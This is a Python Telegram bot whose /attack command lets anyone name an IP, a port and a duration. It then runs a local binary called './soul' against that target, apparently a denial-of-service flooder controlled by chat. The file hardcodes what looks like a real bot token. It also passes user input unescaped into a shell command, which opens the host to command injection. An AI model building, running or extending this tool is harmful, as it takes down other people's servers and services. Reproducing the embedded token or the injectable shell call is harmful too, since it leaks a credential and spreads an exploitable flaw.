import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8672083948:AAGa0UxQS1jurCzpNKG2fJ6FOyetBGye7ZE"

# START
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔥 Bot Active\nUse /attack ip port time")

# ATTACK (Everyone allowed)
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if len(context.args) != 3:
        await update.message.reply_text("Use: /attack ip port time")
        return

    ip, port, duration = context.args

    await update.message.reply_text(f"🚀 Attack Started\n{ip}:{port}")

    process = await asyncio.create_subprocess_shell(
        f"./soul {ip} {port} {duration} 1200"
    )

    await process.communicate()

    await update.message.reply_text("✅ Attack Done")

# MAIN
def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))

    app.run_polling()

if __name__ == "__main__":
    main()
